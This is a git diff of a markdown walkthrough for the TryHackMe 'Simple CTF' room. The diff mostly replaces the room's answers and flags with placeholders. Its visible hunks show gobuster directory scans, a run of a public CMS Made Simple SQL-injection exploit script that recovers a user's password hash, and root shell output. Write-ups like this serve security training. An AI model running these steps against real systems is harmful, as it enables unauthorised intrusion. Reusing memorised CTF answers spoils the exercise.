@@ -1,4 +1,4 @@
-# Simple CTF  [THM]
+# Simple CTF [THM](https://tryhackme.com/room/easyctf)
 
 Let see what's running on this machine 
 
@@ -100,16 +100,13 @@ cat ForMitch.txt
 Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
 ```
 
-Using Gobuster we were able to discover these folders
+Using Gobuster we were able to discover few folders
 
 ```bash
 gobuster dir -u http://10.10.219.139:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 
 /simple (Status: 301)
 ```
-
-Visiting `http://10.10.219.139:80/simple` we know that we are working with CMSMadeSimple (maybe version 2.2.8)
-
 ```bash
 gobuster dir -u http://10.10.219.139:80/simple -w /usr/share/wordlists/dirb/common.txt -x .bak, .sql, .log
 
@@ -131,6 +128,8 @@ gobuster dir -u http://10.10.219.139:80/simple -w /usr/share/wordlists/dirb/comm
 /tmp (Status: 301)
 /uploads (Status: 301)
 ``` 
+
+Visiting `http://10.10.219.139:80/simple` we know that we are working with CMSMadeSimple (maybe version 2.2.8).  
 
 Let search the exploit database for any information about this CMS version
 
@@ -195,7 +194,7 @@ python 46635.py -u http://10.10.219.139:80/simple --wordlist=/usr/share/wordlist
 [+] Username found: mitch
 [+] Email found: admin@admin.com
 [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
-[+] Password cracked: secret
+[+] Password cracked: xxxxx
 ```
 
 ### 7. Where can you login with the details obtained?
@@ -230,14 +229,14 @@ $ id
 uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
 
 $ cat /home/mitch/user.txt                                                                                                             
-G00d j0b, keep up!
+xxxxx
 ```
 
 ### 9. Is there any other user in the home directory? What's its name?
 
 ```bash
 $ ls /home                                                                                                                             
-mitch  sunbath
+mitch  xxxx
 ```
 
 ### 10. What can you leverage to spawn a privileged shell?
@@ -267,5 +266,5 @@ total 28
 1044582 -rw-r--r--  1 root root   24 aug 17  2019 root.txt
 
 # cat /root/root.txt
-W3ll d0n3. You made it!
+XXXXX
 ```
